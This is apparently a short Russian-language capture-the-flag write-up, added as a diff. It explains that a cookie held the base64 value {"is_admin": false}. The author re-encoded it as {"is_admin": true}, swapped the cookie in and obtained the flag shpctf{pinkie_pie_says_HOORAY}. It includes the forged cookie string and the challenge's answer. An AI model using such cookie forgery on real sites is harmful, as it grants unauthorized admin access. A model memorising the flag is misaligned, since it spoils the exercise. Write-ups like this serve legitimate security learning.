@@ -1,0 +1,12 @@
+тут все банально очень, зашел в куку увидел base64 зашел в кибер шеф, декодировал
+
+eyJpc19hZG1pbiI6IGZhbHNlfQ==
+{"is_admin": false}
+
+
+закодировал
+{"is_admin": true}
+eyJpc19hZG1pbiI6IHRydWV9
+
+заменил куки и получил
+Ура, твой флаг — shpctf{pinkie_pie_says_HOORAY}
